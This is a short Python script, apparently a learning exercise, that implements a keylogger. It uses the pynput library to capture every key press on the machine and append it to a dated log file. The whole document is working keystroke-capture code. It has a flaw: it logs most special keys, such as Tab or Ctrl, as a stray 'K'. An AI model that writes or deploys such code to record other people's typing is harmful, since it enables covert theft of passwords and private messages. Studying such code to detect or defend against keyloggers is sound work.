"""Learnig Key Logger"""

import os
from datetime import date 
from pynput import keyboard 

os.system(command="cls")


def on_press(key):
    """On Key Press"""

    today = date.today()
    today_string = str(today).replace("-","_")
    file_name = f"Data_{today_string}.log"
    with open(file=file_name, mode="at", encoding="utf-8") as file:
        match key:
            case keyboard.Key.shift:
                pass
            case keyboard.Key.shift_l:
                pass
            case keyboard.Key.shift_r:
                pass
            case keyboard.Key.backspace:
                file.write("[BACK]")
            case keyboard.Key.space:
                file.write(" ")
            case keyboard.Key.enter:
                file.write("\n")
            case _:
                full_key = str(key)
                pure_key = full_key[1]
                file.write(pure_key)

with keyboard.Listener(on_press=on_press) as Listener:
    Listener.join()                